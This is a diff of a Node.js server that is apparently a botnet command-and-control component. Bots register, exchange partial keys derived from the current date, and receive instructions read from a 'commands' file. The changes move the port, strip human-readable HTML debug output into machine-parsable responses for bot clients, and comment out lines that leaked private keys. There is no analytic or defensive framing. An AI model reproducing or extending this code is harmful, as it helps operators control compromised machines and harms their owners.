@@ -3,7 +3,7 @@ var url  = require('url');
 var fs = require('fs'); /* to read files */
 
 var FILE = 'commands';
-var PORT = 3001;
+var PORT = 5000;
 
 var ALPHA = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
 var ALPHA_SIZE = ALPHA.length;
@@ -18,7 +18,7 @@ var connections = {};
 Connection = function(bot_client_partial_key) {
 
 	var fun_connect = function connect(k_c){
-		var date = new Date();	
+		var date = new Date();
 		var day = date.getDate();
 		var base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
 		var N = 2147483647; // INT_MAX
@@ -41,7 +41,6 @@ Connection = function(bot_client_partial_key) {
 		for (var i = 0; i < n; i++){
 			index = (ALPHA.charCodeAt(str_key.charCodeAt(i) % ALPHA_SIZE) + i*i ) % ALPHA_SIZE;
 			exp_key = exp_key + ALPHA[index];
-
 		}
 		return exp_key;
 	}
@@ -112,13 +111,13 @@ function generateConnectionId(){
 
 function first_connection (bot_client_partial_key, confirm_value, response){
 	connection = new Connection (bot_client_partial_key);
-	response.write("<h2>NOW, YOUR ID IS "+connection.id+"</h2>");
-	response.write("<h4>KEY_SERVER "+connection.bot_master_partial_key +"</h2>");
+	response.write("id:"+connection.id+"\n");
+	response.write("k_s:"+connection.bot_master_partial_key +"\n");
 	var confirmation = confirm_value ^ connection.private_key;
-	response.write("<h5>CONFIRMATION MESSAGE IS "+confirmation+"</h6>");
-	response.write("<h6>PRIVATE KEY "+connection.private_key+"</h6>");
-	response.write("<h6>EXPANDED PRIVATE KEY "+connection.expanded_private_key+"</h6>");
-	response.write("<h3>ENCRYPTED CONFIRM MESSAGE '"+connection.encrypt(confirm_value)+"'</h3>");
+//	response.write("confirm:"+confirmation+"\n");
+//	response.write("<h6>PRIVATE KEY "+connection.private_key+"</h6>");
+//	response.write("<h6>EXPANDED PRIVATE KEY "+connection.expanded_private_key+"</h6>");
+	response.write("confirm:"+connection.encrypt(confirm_value));
 
 	connections[connection.id] = connection; // save this connection into the hash of connections
 }
@@ -150,10 +149,10 @@ var server = http.createServer(function (request, response){
 	}else{		
 		connection = find_connection(params['id']);
 		if (connection == null){
-			response.write("<h3>The connection " + params['id'] + " was not found  :(</h3>");
+			response.write("id:" + params['id']);
 			response.end();
 		}else{
-			response.write("<h3>ID: " + connection.id + "<br/>Number of connections: "+ connection.count + "</h3>");
+			response.write("id:" + connection.id + "\n");
 			// Read the file with the commands and send these commands to the client.
 			fs.readFile(FILE, 'utf8', function (err,data) {
 				if (err) {
